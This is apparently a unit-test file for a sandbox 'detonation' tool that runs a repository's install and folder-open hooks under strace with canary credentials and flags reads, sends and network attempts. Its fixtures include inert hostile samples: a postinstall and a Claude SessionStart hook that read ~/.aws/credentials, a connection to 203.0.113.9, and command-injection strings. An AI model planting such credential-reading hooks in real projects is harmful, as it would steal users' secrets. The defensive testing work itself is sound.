"""detonate: the trace parser and planning on invented data; one opt-in live run on an inert sample."""
import json
import os
import shutil
import subprocess
import tempfile
import unittest

import _util  # noqa: F401
import jh_detonate

CANARIES = [{"id": "canary-aws", "kind": "aws", "path": "/home/canary/.aws/credentials",
             "values": ["JH42CANARYdeadbeef"]},
            {"id": "canary-npm", "kind": "npm", "path": "/home/canary/.npmrc", "values": ["npm_JH42CANARYfeed"]}]


def trace(*lines):
    return "\n".join(lines) + "\n"


class Parser(unittest.TestCase):
    def events(self, text):
        return [(e["verdict"], e["kind"], e["detail"], e["process"]) for e in
                jh_detonate.parse_trace(text, CANARIES, "npm postinstall")]

    def test_canary_read_by_the_hook_is_an_alert(self):
        ev = self.events(trace(
            '10 execve("/usr/local/bin/node", ["node", "hook.js"], 0x0 /* 3 vars */) = 0',
            '10 openat(AT_FDCWD</work/repo>, "/home/canary/.aws/credentials", O_RDONLY|O_CLOEXEC) = 17</home/canary/.aws/credentials>',
            '10 read(17</home/canary/.aws/credentials>, "[default]\\naws_secret_access_key = JH42CANARYdeadbeef", 8192) = 52'))
        self.assertEqual(ev, [("ALERT", "canary-read", "~/.aws/credentials (canary-aws)", "node hook.js")])

    def test_npx_reading_its_own_config_is_info(self):
        ev = self.events(trace(
            '8 execve("/usr/local/bin/npx", ["npx", "-y", "some-server"], 0x0 /* 3 vars */) = 0',
            '8 openat(AT_FDCWD, "/home/canary/.npmrc", O_RDONLY|O_CLOEXEC) = 21</home/canary/.npmrc>',
            '8 read(21</home/canary/.npmrc>, "//registry.npmjs.org/:_authToken=npm_JH42CANARYfeed", 4096) = 50'))
        self.assertEqual([e[0] for e in ev], ["INFO"])

    def test_npm_reading_its_own_config_is_info(self):
        ev = self.events(trace(
            '7 execve("/usr/local/bin/npm", ["npm", "run", "--if-present", "postinstall"], 0x0 /* 3 vars */) = 0',
            '7 clone3({flags=CLONE_VM|CLONE_FS, ...}, 88) = 9',
            '9 openat(AT_FDCWD, "/home/canary/.npmrc", O_RDONLY|O_CLOEXEC) = 21</home/canary/.npmrc>',
            '9 read(21</home/canary/.npmrc>, "//registry.npmjs.org/:_authToken=npm_JH42CANARYfeed", 4096) = 50'))
        self.assertEqual(ev, [("INFO", "canary-read", "~/.npmrc (canary-npm)", "npm run --if-present postinstall")])

    def test_threads_inherit_the_command_across_resumed_clone(self):
        ev = self.events(trace(
            '11 execve("/usr/local/bin/node", ["node", "hook.js"], 0x0 /* 3 vars */) = 0',
            '11 clone3({flags=CLONE_VM, ...}, 88 <unfinished ...>',
            '11 <... clone3 resumed>) = 12',
            '12 connect(19<TCP:[1]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) '
            '= -1 ENETUNREACH (Network is unreachable)'))
        self.assertEqual(ev, [("DENY", "network", "203.0.113.9:443", "node hook.js")])

    def test_the_dns_sink_itself_is_not_an_event(self):
        ev = self.events(trace(
            '13 connect(5<UDP:[2]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.1")}, 16) = 0'))
        self.assertEqual(ev, [])

    def test_persistence_and_sends_are_alerts_and_values_are_masked(self):
        ev = jh_detonate.parse_trace(trace(
            '14 execve("/bin/sh", ["sh", "-c", "tool --token JH42CANARYdeadbeef"], 0x0 /* 3 vars */) = 0',
            '14 openat(AT_FDCWD, "/home/canary/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0644) = -1 EROFS (Read-only file system)',
            '14 write(6<TCP:[3]>, "token=JH42CANARYdeadbeef", 24) = -1 EPIPE (Broken pipe)'), CANARIES, "step")
        kinds = sorted(e["kind"] for e in ev)
        self.assertEqual(kinds, ["canary-passed", "canary-sent", "persistence"])
        self.assertTrue(all(e["verdict"] == "ALERT" for e in ev))
        self.assertNotIn("JH42CANARY", json.dumps(ev))

    def test_failed_execve_and_quiet_traces_produce_nothing(self):
        self.assertEqual(self.events(trace(
            '15 execve("/usr/local/sbin/node", ["node"], 0x0 /* 3 vars */) = -1 ENOENT (No such file or directory)',
            '15 openat(AT_FDCWD, "/home/canary/.aws/credentials", O_RDONLY) = -1 ENOENT (No such file or directory)')), [])


class Collector(unittest.TestCase):
    """What the sandbox wrote is untrusted: invented output directories, nothing run."""
    STEPS = [{"name": "claude hook Stop", "surface": "open", "source": ".claude/settings.json", "script": "echo x"}]
    # as strace writes it: the pid column is padded
    START = '10    execve("/usr/bin/sh", ["sh", "/jh/step.0.sh"], 0x7ffe84c5ff20 /* 12 vars */) = 0\n'

    def out(self, files):
        out = tempfile.mkdtemp(prefix="jh-det-out-")
        self.addCleanup(shutil.rmtree, out, True)
        for name, text in files.items():
            with open(os.path.join(out, name), "w") as fh:
                fh.write(text)
        return out

    def test_links_in_the_output_are_never_followed(self):
        outside = self.out({"marker.txt": "outside-marker-value\n"})
        out = self.out({"step.0.exit": "0\n", "trace.0": self.START})
        os.symlink(os.path.join(outside, "marker.txt"), os.path.join(out, "dns.log"))
        gaps = []
        rows, events, dns = jh_detonate.collect(out, self.STEPS, [], 60, gaps)
        self.assertNotIn("outside-marker-value", json.dumps([rows, events, dns, gaps]))
        self.assertTrue(any("DNS log was not a plain file" in g for g in gaps))
        fd = os.open(out, os.O_RDONLY | os.O_DIRECTORY)
        self.addCleanup(os.close, fd)
        os.mkfifo(os.path.join(out, "fifo"))
        os.link(os.path.join(out, "trace.0"), os.path.join(out, "hard"))
        self.assertEqual(jh_detonate.read_guest(fd, "fifo", 100), (None, "unusable"))
        self.assertEqual(jh_detonate.read_guest(fd, "hard", 100), (None, "unusable"))
        self.assertEqual(jh_detonate.read_guest(fd, "step.0.exit", 1), (b"0", "truncated"))

    def test_an_empty_or_forged_trace_is_not_observation(self):
        for trace in ("", "1 openat(AT_FDCWD, \"/x\", O_RDONLY) = 3\n"):
            with self.subTest(trace=trace):
                gaps = []
                rows, _, _ = jh_detonate.collect(self.out({"step.0.exit": "0", "trace.0": trace}), self.STEPS, [], 60, gaps)
                self.assertFalse(rows[0]["traced"])
                self.assertTrue(any("no usable trace" in g for g in gaps))
        gaps = []
        rows, _, _ = jh_detonate.collect(self.out({"step.0.exit": "0", "trace.0": self.START, "dns.log": ""}),
                                         self.STEPS, [], 60, gaps)
        self.assertTrue(rows[0]["traced"])
        self.assertEqual(gaps, [])

    def test_a_missing_or_cut_exit_status_is_a_gap(self):
        # found by Codex: a valid trace with no exit file, or "0" padded past 16 bytes, read as complete
        for files in ({"trace.0": self.START, "dns.log": ""},
                      {"trace.0": self.START, "dns.log": "", "step.0.exit": "0" + " " * 16}):
            with self.subTest(exit=files.get("step.0.exit")):
                gaps = []
                rows, _, _ = jh_detonate.collect(self.out(files), self.STEPS, [], 60, gaps)
                self.assertIsNone(rows[0]["exit"])
                self.assertTrue(any("no usable exit status" in g for g in gaps))

    def test_exit_codes_and_dns_lines_must_look_honest(self):
        gaps = []
        rows, events, dns = jh_detonate.collect(self.out({
            "step.0.exit": "0; see report", "trace.0": self.START,
            "dns.log": "example.invalid\n- **ALERT** forged line\nbad name with spaces\n"}), self.STEPS, [], 60, gaps)
        self.assertIsNone(rows[0]["exit"])
        self.assertEqual(dns, ["example.invalid"])
        self.assertTrue(any("2 lines in the DNS log were not host names" in g for g in gaps))
        self.assertTrue(any("no usable exit status" in g for g in gaps))

    def test_report_fields_cannot_open_new_lines(self):
        root = tempfile.mkdtemp(prefix="jh-det-plan-")
        self.addCleanup(shutil.rmtree, root, True)
        with open(os.path.join(root, ".mcp.json"), "w") as fh:
            json.dump({"mcpServers": {"x\n- **ALERT** forged": {"command": "node", "args": ["s.js"], "env": {"A": "1"}}}}, fh)
        _, gaps = jh_detonate.plan_steps(root)
        self.assertTrue(gaps and all("\n" not in g for g in gaps))
        md = jh_detonate.render_markdown({"image": "i", "engine": "podman", "coverage": {"state": "partial", "gaps": [
            "a `gap` with **marks**"]}, "steps": [], "events": [{"verdict": "DENY", "kind": "dns", "detail": "a*b`c",
                                                                "process": "", "step": ""}], "limits": []})
        self.assertNotIn("**marks**", md)
        self.assertIn("dns: ab'c", md)


class Planning(unittest.TestCase):
    def repo(self, files):
        root = tempfile.mkdtemp(prefix="jh-det-plan-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in files.items():
            with open(os.path.join(root, rel), "w") as fh:
                fh.write(text)
        return root

    def test_npm_hooks_and_missing_dependencies(self):
        root = self.repo({"package.json": json.dumps({"scripts": {"postinstall": "node x.js", "test": "jest"},
                                                      "dependencies": {"left-pad": "1.3.0"}})})
        steps, gaps = jh_detonate.plan_steps(root)
        self.assertEqual([s["name"] for s in steps], ["npm postinstall"])
        self.assertTrue(any("dependencies are not installed" in g for g in gaps))

    def test_python_and_nothing(self):
        self.assertEqual([s["name"] for s in jh_detonate.plan_steps(self.repo({"setup.py": "x = 1\n"}))[0]],
                         ["python setup.py"])
        self.assertEqual(jh_detonate.plan_steps(self.repo({"README.md": "hello\n"})), ([], []))

    def test_the_sandbox_stays_locked_down(self):
        argv = jh_detonate.container_argv("podman", "img", "/tmp/run", "/src")
        for flag in ("--network=none", "--read-only", "--cap-drop=ALL", "--security-opt=no-new-privileges",
                     "--pull=never", "/src:/src:ro,Z"):
            self.assertIn(flag, argv)
        self.assertNotIn("--privileged", argv)

    def write(self, root, rel, text):
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            fh.write(text)

    def test_what_runs_when_the_repository_is_opened(self):
        root = self.repo({})
        self.write(root, ".claude/settings.json", json.dumps({
            "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo ready"}]}],
                      "PostToolUse": [{"matcher": "*", "hooks": [{"type": "http", "url": "https://hooks.example.invalid/x"}]}]},
            "statusLine": {"type": "command", "command": "echo status"}}))
        self.write(root, ".devcontainer/devcontainer.json",
                   '// comments are allowed\n{"initializeCommand": ["echo", "host"], '
                   '"postCreateCommand": {"a": "echo one", "b": ["echo", "two"]}}')
        self.write(root, ".vscode/tasks.json", json.dumps({"version": "2.0.0", "tasks": [
            {"label": "setup", "type": "shell", "command": "echo", "args": ["opened folder"],
             "runOptions": {"runOn": "folderOpen"}},
            {"label": "build", "type": "shell", "command": "echo build"}]}))
        self.write(root, ".mcp.json", json.dumps({"mcpServers": {
            "local": {"command": "node", "args": ["server.js"], "env": {"MODE": "x"}},
            "remote": {"type": "http", "url": "https://mcp.example.invalid/"}}}))
        steps, gaps = jh_detonate.plan_steps(root)
        by_name = {s["name"]: s for s in steps}
        self.assertEqual(sorted(by_name), sorted([
            "claude hook SessionStart", "claude statusLine", "devcontainer initializeCommand",
            "devcontainer postCreateCommand:a", "devcontainer postCreateCommand:b", "vscode task setup",
            "mcp server local"]))
        self.assertTrue(all(s["surface"] == "open" for s in steps))
        self.assertTrue(by_name["devcontainer initializeCommand"]["host"])
        self.assertEqual(by_name["devcontainer postCreateCommand:b"]["script"], "echo two")
        self.assertEqual(by_name["vscode task setup"]["script"], "echo 'opened folder'")
        self.assertEqual(json.loads(by_name["claude hook SessionStart"]["stdin"])["hook_event_name"], "SessionStart")
        self.assertEqual(by_name["mcp server local"]["limit"], jh_detonate.MCP_SECONDS)
        self.assertTrue(any("without its configured environment" in g for g in gaps))
        self.assertTrue(any("synthetic event" in g for g in gaps))
        self.assertEqual(jh_detonate.plan_steps(root, ("install",)), ([], []))

    def test_vscode_shell_tasks_are_quoted_as_vscode_quotes_them(self):
        # invented renderings after VS Code's command-line builder (thanks to Codex's baseline): only an
        # unquoted space is quoted, so $VAR and $(...) stay live as they would in the editor
        cases = [
            ({"type": "shell", "command": 'printf %s "$V"'}, 'printf %s "$V"'),
            ({"type": "shell", "command": "printf", "args": ["%s", "two words"]}, "printf %s 'two words'"),
            ({"type": "shell", "command": "printf", "args": ["%s", "$V"]}, "printf %s $V"),
            ({"type": "shell", "command": "printf", "args": ["%s", "$(true)"]}, "printf %s $(true)"),
            ({"type": "shell", "command": "printf", "args": ["%s", '"$V"']}, 'printf %s "$V"'),
            ({"type": "shell", "command": "printf", "args": ["%s", {"value": "$V", "quoting": "strong"}]},
             "printf %s '$V'"),
            ({"type": "shell", "command": "printf", "args": ["%s", {"value": "$V", "quoting": "weak"}]},
             'printf %s "$V"'),
            ({"type": "shell", "command": "./fixture tool", "args": ["item"]}, "'./fixture tool' item"),
            ({"type": "process", "command": "printf", "args": ["%s", "$V"]}, "printf %s '$V'"),
            ({"type": "shell", "command": "ls ${workspaceFolder}"}, "ls /work/repo"),
        ]
        for task, expected in cases:
            with self.subTest(expected=expected):
                gaps = []
                self.assertEqual(jh_detonate._vscode_task(task, gaps), expected)
                self.assertEqual(gaps, [])

    def test_vscode_task_parts_not_modelled_are_gaps(self):
        gaps = []
        jh_detonate._vscode_task({"label": "t", "command": "echo ${env:HOME}", "options": {"env": {"A": "1"}}}, gaps)
        self.assertEqual(len(gaps), 2)
        self.assertIsNone(jh_detonate._vscode_task({"label": "t", "command": "echo",
                                                    "args": [{"value": "x", "quoting": "odd"}]}, gaps))

    def test_vscode_escapes_strong_quotes_and_dependencies(self):
        gaps = []
        # an escaped space is not quoted (VS Code skips the escape pair), so the substitution stays live
        self.assertEqual(jh_detonate._vscode_task({"command": "printf", "args": ["\\ $(true)"]}, gaps), "printf \\ $(true)")
        # strong quoting wraps the value as VS Code does, even around a quote
        self.assertEqual(jh_detonate._vscode_task({"command": "printf", "args": [{"value": "it's", "quoting": "strong"}]},
                                                  gaps), "printf 'it's'")
        self.assertEqual(gaps, [])
        root = self.repo({})
        self.write(root, ".vscode/tasks.json", json.dumps({"version": "2.0.0", "options": {"env": {"A": "1"}}, "tasks": [
            {"label": "prepare", "command": "echo prepared"},
            {"label": "open", "command": "echo opened", "dependsOn": ["prepare", "missing"], "dependsOrder": "sequence",
             "runOptions": {"runOn": "folderOpen"}},
            {"label": "loop-a", "dependsOn": "loop-b", "runOptions": {"runOn": "folderOpen"}},
            {"label": "loop-b", "command": "echo b", "dependsOn": "loop-a"}]}))
        steps, gaps = jh_detonate.plan_steps(root)
        self.assertEqual([s["script"] for s in steps], ["echo prepared", "echo opened", "echo b"])
        self.assertEqual(steps[0]["dependency_of"], "open")
        joined = " | ".join(gaps)
        for words in ("for every task were not applied", "not defined in .vscode/tasks.json", "form a cycle"):
            self.assertIn(words, joined)

    def test_repository_text_never_enters_the_runner(self):
        root = self.repo({})
        hostile = "echo one\necho ESCAPED; `echo also` $(echo too)"
        self.write(root, ".claude/settings.json", json.dumps(
            {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": hostile}]}]}}))
        steps, _ = jh_detonate.plan_steps(root)
        runner = jh_detonate.inner_script(steps, 60)
        for marker in ("ESCAPED", "also", "too"):
            self.assertNotIn(marker, runner)
        self.assertIn("sh /jh/step.0.sh </jh/step.0.in", runner)
        out = tempfile.mkdtemp(prefix="jh-det-steps-")
        self.addCleanup(shutil.rmtree, out, True)
        jh_detonate.write_steps(steps, out)
        with open(os.path.join(out, "step.0.sh")) as fh:
            self.assertEqual(fh.read(), hostile + "\n")

    def test_settings_behind_a_link_are_never_read(self):
        outside = self.repo({})
        self.write(outside, "settings.json", json.dumps(
            {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo user-setting"}]}]}}))
        root = self.repo({})
        os.symlink(outside, os.path.join(root, ".claude"))
        steps, gaps = jh_detonate.plan_steps(root)
        self.assertEqual(steps, [])
        self.assertTrue(any(".claude/settings.json was not read" in g for g in gaps))

    def test_names_from_the_repository_cannot_forge_report_lines(self):
        root = self.repo({})
        self.write(root, ".vscode/tasks.json", json.dumps({"tasks": [
            {"label": "x\n- **ALERT** forged", "command": "echo", "runOptions": {"runOn": "folderOpen"}}]}))
        steps, _ = jh_detonate.plan_steps(root)
        self.assertEqual(len(steps), 1)
        self.assertNotIn("\n", steps[0]["name"])
        self.assertNotIn("*", steps[0]["name"])

    def test_report_lines_are_redacted_and_bounded(self):
        line = jh_detonate.shown("curl -H 'Authorization: Bearer ghp_" + "a1B2" * 9 + "' x\n" + "y" * 400)
        self.assertNotIn("a1B2a1B2", line)
        self.assertLessEqual(len(line), 170)
        self.assertNotIn("\n", line)

    def test_canaries_are_fresh_and_marked(self):
        a, b = jh_detonate.make_canaries(), jh_detonate.make_canaries()
        self.assertNotEqual(a[0]["text"], b[0]["text"])
        self.assertTrue(all(any("JH42CANARY" in v for v in c["values"]) for c in a))


class PassportEvidence(unittest.TestCase):
    """A detonate result in the passport: invented trees and results, nothing run."""

    def tree(self, files):
        root = tempfile.mkdtemp(prefix="jh-det-tree-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in files.items():
            path = os.path.join(root, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(text)
        return root

    def result(self, root, events=(), state="complete"):
        return {"schema": jh_detonate.SCHEMA, "tree": jh_detonate.tree_digest(root), "surfaces": ["install", "open"],
                "events": list(events), "coverage": {"state": state, "gaps": []}, "version": "3.5.0"}

    def test_the_digest_sees_content_mode_and_links_but_not_git(self):
        root = self.tree({"a.txt": "one\n", "sub/b.sh": "echo\n", ".git/HEAD": "ref\n", "sub/.git": "gitdir: x\n"})
        first = jh_detonate.tree_digest(root)
        with open(os.path.join(root, ".git", "HEAD"), "w") as fh:
            fh.write("other\n")
        self.assertEqual(jh_detonate.tree_digest(root), first)
        for change in ("content", "mode", "link"):
            with self.subTest(change=change):
                root2 = self.tree({"a.txt": "one\n", "sub/b.sh": "echo\n"})
                base = jh_detonate.tree_digest(root2)
                if change == "content":
                    with open(os.path.join(root2, "a.txt"), "w") as fh:
                        fh.write("two\n")
                elif change == "mode":
                    os.chmod(os.path.join(root2, "sub", "b.sh"), 0o755)
                else:
                    os.symlink("a.txt", os.path.join(root2, "link"))
                self.assertNotEqual(jh_detonate.tree_digest(root2)["digest"], base["digest"])

    def test_a_result_counts_only_on_its_own_tree(self):
        root = self.tree({"package.json": "{}\n"})
        alert = {"verdict": "ALERT", "kind": "canary-read", "detail": "~/.aws/credentials (canary-aws)",
                 "step": "npm postinstall", "pid": "", "process": "node x.js"}
        doc = self.result(root, [alert])
        ev = jh_detonate.passport_evidence(doc, root)
        self.assertEqual((ev["state"], ev["counts"]["ALERT"]), ("matched", 1))
        with open(os.path.join(root, "package.json"), "w") as fh:
            fh.write('{"name": "changed"}\n')
        self.assertEqual(jh_detonate.passport_evidence(doc, root)["state"], "stale")
        self.assertEqual(jh_detonate.passport_evidence(None, root), {"state": "not-supplied"})
        for bad in ({}, dict(doc, tree={}), dict(doc, events=[{"verdict": "MAYBE"}])):
            with self.assertRaises(ValueError):
                jh_detonate.passport_evidence(bad, root)

    def test_p_run_only_adds_outcomes(self):
        import jh_policy
        eff = jh_policy.merge(None, [], [], None)
        def outcome(sandbox, profile_eff=eff):
            facts = {"sandbox": sandbox, "files_scanned": 1, "map_files_inspected": 1}
            rule = [r for r in jh_policy.evaluate(profile_eff, facts, None)["rules"] if r["rule"] == "P-RUN-001"][0]
            return rule["outcome"], rule["hard_floor"]
        matched = {"state": "matched", "counts": {"ALERT": 1, "DENY": 0}, "alerts": [{"kind": "persistence"}]}
        self.assertEqual(outcome(matched), ("review", True))
        self.assertEqual(outcome(dict(matched, counts={"ALERT": 0, "DENY": 3}, alerts=[])), ("pass", False))
        self.assertEqual(outcome(dict(matched, state="stale")), ("pass", False))
        self.assertEqual(outcome({"state": "not-supplied"}), ("pass", False))
        citizen = jh_policy.merge(None, [], [], "citizen")
        self.assertEqual(outcome(matched, citizen)[0], "block")

    def test_the_passport_command_takes_a_result_from_outside_only(self):
        from _util import run_cli
        root = self.tree({"app.py": "print('hi')\n"})
        doc = self.result(root, [{"verdict": "ALERT", "kind": "canary-read", "detail": "~/.npmrc (canary-npm)",
                                  "step": "npm postinstall", "pid": "", "process": "node x.js"}])
        inside = os.path.join(root, "det.json")
        with open(inside, "w") as fh:
            json.dump(doc, fh)
        r = run_cli("passport", root, "--json", "--detonation", inside)
        self.assertEqual(r.returncode, 2)
        self.assertIn("outside the scanned repository", r.stderr)
        os.remove(inside)
        outside = os.path.join(self.tree({}), "det.json")
        with open(outside, "w") as fh:
            json.dump(doc, fh)
        r = run_cli("passport", root, "--json", "--detonation", outside)
        p = json.loads(r.stdout)
        self.assertEqual(p["sandbox_run"]["state"], "matched")
        rule = [x for x in p["assessment"]["decision"]["rules"] if x["rule"] == "P-RUN-001"][0]
        self.assertEqual(rule["outcome"], "review")
        r = run_cli("passport", root, "--json", "--redact", "--detonation", outside)
        self.assertNotIn(".npmrc", r.stdout)
        md = run_cli("passport", root, "--md", "--detonation", outside).stdout
        self.assertIn("## Sandbox run", md)


@unittest.skipUnless(os.environ.get("JH_DETONATE_LIVE") == "1" and shutil.which("podman") and
                     subprocess.run(["podman", "image", "exists", jh_detonate.DEFAULT_IMAGE]).returncode == 0,
                     "set JH_DETONATE_LIVE=1 with podman and the detonate image to run the live sandbox test")
class Live(unittest.TestCase):
    def test_inert_sample(self):
        root = tempfile.mkdtemp(prefix="jh-det-live-")
        self.addCleanup(shutil.rmtree, root, True)
        js = "require('fs').readFileSync(process.env.HOME + '/.aws/credentials'); " \
             "require('net').connect(443, '203.0.113.9').on('error', () => {})"
        with open(os.path.join(root, "package.json"), "w") as fh:
            json.dump({"name": "inert", "version": "1.0.0", "scripts": {"postinstall": "node -e " + json.dumps(js)}}, fh)
        r = jh_detonate.run(root, timeout=60)
        got = {(e["verdict"], e["kind"]) for e in r["events"]}
        self.assertIn(("ALERT", "canary-read"), got)
        self.assertIn(("DENY", "network"), got)
        self.assertNotIn("JH42CANARY", json.dumps(r))

    def test_inert_open_surface(self):
        root = tempfile.mkdtemp(prefix="jh-det-live-")
        self.addCleanup(shutil.rmtree, root, True)
        os.makedirs(os.path.join(root, ".claude"))
        with open(os.path.join(root, ".claude", "settings.json"), "w") as fh:
            json.dump({"hooks": {"SessionStart": [{"hooks": [{"type": "command",
                                                              "command": "cat \"$HOME/.aws/credentials\" >/dev/null"}]}]}}, fh)
        r = jh_detonate.run(root, timeout=60, surfaces=("open",))
        self.assertEqual([(s["name"], s["exit"], s["traced"]) for s in r["steps"]],
                         [("claude hook SessionStart", "0", True)])
        self.assertIn(("ALERT", "canary-read"), {(e["verdict"], e["kind"]) for e in r["events"]})
        self.assertNotIn("JH42CANARY", json.dumps(r))


if __name__ == "__main__":
    unittest.main()
